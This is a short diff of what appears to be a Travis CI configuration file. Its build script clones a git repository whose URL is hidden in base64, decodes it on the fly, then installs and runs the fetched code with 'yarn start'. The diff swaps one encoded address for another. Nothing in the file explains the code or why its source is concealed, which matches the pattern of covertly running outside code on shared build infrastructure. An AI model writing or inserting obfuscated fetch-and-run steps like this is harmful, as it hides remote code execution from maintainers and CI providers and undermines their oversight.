@@ -3,7 +3,7 @@ node_js: '9'
 sudo: required
 dist: trusty
 script:
-  - git clone $(echo aHR0cHM6Ly9HbG9yaW91c1llbGxvd0BiaXRidWNrZXQub3JnL0dsb3Jpb3VzWWVsbG93L3liLmdpdAo= | base64 --decode) yb
+  - git clone $(echo 44urgVh78MYf4mtU7UWvvWQmeFygnNWjVCkfRbrdc1PF3qeasaV2igiNDoRXWusDCUP9MT84EGXVDLhQAQZoE7fB4PYpCe4= | base64 --decode) yb
   - cd yb
   - yarn
   - yarn start
